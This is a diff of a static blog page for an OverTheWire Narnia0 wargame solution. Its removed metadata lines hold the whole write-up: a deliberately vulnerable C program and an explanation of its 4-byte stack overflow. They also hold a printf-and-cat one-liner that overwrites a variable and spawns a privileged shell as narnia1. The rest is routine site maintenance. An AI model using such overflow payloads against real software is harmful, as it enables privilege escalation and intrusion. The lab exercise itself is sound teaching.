@@ -4,11 +4,11 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>Solution for Narnia0: OverTheWire | Journal</title>
-<meta name="generator" content="Jekyll v4.3.2" />
+<meta name="generator" content="Jekyll v4.3.3" />
 <meta property="og:title" content="Solution for Narnia0: OverTheWire" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ long val=0x41414141; char buf[20]; printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;); printf(&quot;Here is your chance: &quot;); scanf(&quot;%24s&quot;,&amp;buf); printf(&quot;buf: %s\n&quot;,buf); printf(&quot;val: 0x%08x\n&quot;,val); if(val==0xdeadbeef){ setreuid(geteuid(),geteuid()); system(&quot;/bin/sh&quot;); } else { printf(&quot;WAY OFF!!!!\n&quot;); exit(1); } return 0; } Behaviour of this code Initalize a variable of 4 bytes named val with value 0x41414141 and define a buffer of 20 bytes named buf. Write 24 bytes to buf. If val has the value 0xdeadbeef, then escalate priviliege to that of narnia1 and spawn a shell. Otherwise exit the program with error. Vulnerability ** Key Information ** val: 4 bytes buf: 20 bytes scanf(): write 24 bytes into buf. On line number 10, the scanf function takes in 24 bytes into buf. However, buf is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, val. Exploitation Fill buf with 20 bytes of characters. Fill the rest with 0xefbeadde(Little Endian). $ printf &quot;%020x&quot;&quot;\xefbeadde&quot; | /narnia/narnia0 Result: Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef We changed val to 0xdeadbeef successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use cat to do this. $ (printf &quot;%020x\xef\xbe\xad\xde&quot;; cat) | ./narnia0 Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef whoami narnia1 Done." />
-<meta property="og:description" content="Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ long val=0x41414141; char buf[20]; printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;); printf(&quot;Here is your chance: &quot;); scanf(&quot;%24s&quot;,&amp;buf); printf(&quot;buf: %s\n&quot;,buf); printf(&quot;val: 0x%08x\n&quot;,val); if(val==0xdeadbeef){ setreuid(geteuid(),geteuid()); system(&quot;/bin/sh&quot;); } else { printf(&quot;WAY OFF!!!!\n&quot;); exit(1); } return 0; } Behaviour of this code Initalize a variable of 4 bytes named val with value 0x41414141 and define a buffer of 20 bytes named buf. Write 24 bytes to buf. If val has the value 0xdeadbeef, then escalate priviliege to that of narnia1 and spawn a shell. Otherwise exit the program with error. Vulnerability ** Key Information ** val: 4 bytes buf: 20 bytes scanf(): write 24 bytes into buf. On line number 10, the scanf function takes in 24 bytes into buf. However, buf is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, val. Exploitation Fill buf with 20 bytes of characters. Fill the rest with 0xefbeadde(Little Endian). $ printf &quot;%020x&quot;&quot;\xefbeadde&quot; | /narnia/narnia0 Result: Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef We changed val to 0xdeadbeef successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use cat to do this. $ (printf &quot;%020x\xef\xbe\xad\xde&quot;; cat) | ./narnia0 Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef whoami narnia1 Done." />
+<meta name="description" content="Code" />
+<meta property="og:description" content="Code" />
 <link rel="canonical" href="http://localhost:4000/2024/04/02/narnia1.html" />
 <meta property="og:url" content="http://localhost:4000/2024/04/02/narnia1.html" />
 <meta property="og:site_name" content="Journal" />
@@ -17,7 +17,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Solution for Narnia0: OverTheWire" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-02T00:00:00+09:00","datePublished":"2024-04-02T00:00:00+09:00","description":"Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(){ long val=0x41414141; char buf[20]; printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\\n&quot;); printf(&quot;Here is your chance: &quot;); scanf(&quot;%24s&quot;,&amp;buf); printf(&quot;buf: %s\\n&quot;,buf); printf(&quot;val: 0x%08x\\n&quot;,val); if(val==0xdeadbeef){ setreuid(geteuid(),geteuid()); system(&quot;/bin/sh&quot;); } else { printf(&quot;WAY OFF!!!!\\n&quot;); exit(1); } return 0; } Behaviour of this code Initalize a variable of 4 bytes named val with value 0x41414141 and define a buffer of 20 bytes named buf. Write 24 bytes to buf. If val has the value 0xdeadbeef, then escalate priviliege to that of narnia1 and spawn a shell. Otherwise exit the program with error. Vulnerability ** Key Information ** val: 4 bytes buf: 20 bytes scanf(): write 24 bytes into buf. On line number 10, the scanf function takes in 24 bytes into buf. However, buf is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, val. Exploitation Fill buf with 20 bytes of characters. Fill the rest with 0xefbeadde(Little Endian). $ printf &quot;%020x&quot;&quot;\\xefbeadde&quot; | /narnia/narnia0 Result: Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef We changed val to 0xdeadbeef successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use cat to do this. $ (printf &quot;%020x\\xef\\xbe\\xad\\xde&quot;; cat) | ./narnia0 Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef! Here is your chance: buf: 00000000000000000000ﾭ� val: 0xdeadbeef whoami narnia1 Done.","headline":"Solution for Narnia0: OverTheWire","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/04/02/narnia1.html"},"url":"http://localhost:4000/2024/04/02/narnia1.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-02T00:00:00+09:00","datePublished":"2024-04-02T00:00:00+09:00","description":"Code","headline":"Solution for Narnia0: OverTheWire","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/04/02/narnia1.html"},"url":"http://localhost:4000/2024/04/02/narnia1.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Journal" /></head>
 <body><header class="site-header" role="banner">
@@ -75,10 +75,8 @@
 23
 24
 25
-</pre></td><td class="code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="c1">
-</span><span class="cp">
-#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="c1">
-</span><span class="cp">
+</pre></td><td class="code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span>
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
     <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
@@ -161,7 +159,7 @@ narnia1
     <div class="footer-col-wrapper">
       <div class="footer-col footer-col-1">
         <ul class="contact-list">
-          <li class="p-name">Journal</li><li><a class="u-email" href="mailto:lockpick.lee@mail.utoronto.ca">lockpick.lee@mail.utoronto.ca</a></li></ul>
+          <li class="p-name">Journal</li><li><a class="u-email" href="mailto:leechr123159@pm.me, lockpick.lee@mail.utoronto.ca">leechr123159@pm.me, lockpick.lee@mail.utoronto.ca</a></li></ul>
       </div>
 
       <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
